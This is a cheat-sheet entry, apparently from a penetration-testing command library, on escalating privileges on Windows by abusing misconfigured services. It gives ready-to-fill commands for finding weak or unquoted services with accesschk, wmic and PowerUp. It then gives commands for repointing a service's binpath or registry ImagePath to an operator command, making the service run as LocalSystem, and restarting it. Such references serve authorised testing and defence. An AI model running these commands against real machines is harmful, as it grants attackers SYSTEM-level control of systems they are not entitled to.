---
technique: Windows Service Abuse
category: privilege-escalation
targets: Windows Services
protocols: Local, SCM
remote_capable: false
tags: windows lpe services binpath unquoted-service-path weak-permissions accesschk
---

# Windows Service Abuse

Misconfigured Windows services can expose privilege escalation through writable service control permissions, writable binaries, writable service registry keys, unquoted service paths, or restart rights over services running as `LocalSystem`.

## Prerequisites

| Requirement | Detail |
|-------------|--------|
| Service control | The user needs rights to modify or restart the target service |
| Elevated service account | The target service should run as `LocalSystem` or another privileged account |
| Writable path | Binary replacement or path hijack requires a writable file or directory |

## Windows

### List services

#cmd #services

List all services.

```cmd title:"List all services"
sc query
```
<!-- cheat -->

### Show service configuration

#cmd #services

Show service binary path, startup type, and service account.

```cmd title:"Show service configuration"
sc qc "$service_name"
```
<!-- cheat
var service_name
-->

### Check service permissions

#cmd #accesschk

Check the current user's rights over a specific service.

```cmd title:"Check current user's service rights"
accesschk.exe -ucqv "$service_name"
```
<!-- cheat
var service_name
-->

### Find writable services for current user

#cmd #accesschk

Find services the current user can modify.

```cmd title:"Find services writable by current user"
accesschk.exe -uwcqv %USERNAME% * /accepteula
```
<!-- cheat -->

### Find unquoted service paths

#cmd #unquoted-service-path

Find auto-start services with unquoted paths outside `C:\Windows`.

```cmd title:"Find unquoted auto-start service paths"
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
```
<!-- cheat -->

### Find unquoted service paths with PowerUp

#powershell #powerup

Find unquoted service paths through PowerUp.

```powershell title:"Find unquoted service paths with PowerUp"
Get-ServiceUnquoted -Verbose
```
<!-- cheat -->

### Reconfigure service binary path

#cmd #service-control

Set the target service binary path to an operator command.

```cmd title:"Set service binary path"
sc config "$service_name" binpath= "$command"
```
<!-- cheat
var service_name
var command
-->

### Reconfigure service account to LocalSystem

#cmd #service-control

Set the service to run as `LocalSystem`.

```cmd title:"Set service account to LocalSystem"
sc config "$service_name" obj= ".\LocalSystem" password= ""
```
<!-- cheat
var service_name
-->

### Start service

#cmd #service-control

Start the target service after changing its configuration.

```cmd title:"Start Windows service"
net start "$service_name"
```
<!-- cheat
var service_name
-->

### Overwrite service ImagePath

#cmd #registry

Overwrite a service `ImagePath` value directly in the registry.

```cmd title:"Overwrite service ImagePath registry value"
reg add HKLM\SYSTEM\CurrentControlSet\Services\$service_name /v ImagePath /t REG_EXPAND_SZ /d "$binary_path" /f
```
<!-- cheat
var service_name
var binary_path
-->

## Linux

No Linux operator command is included here. This note covers local Windows service abuse commands.
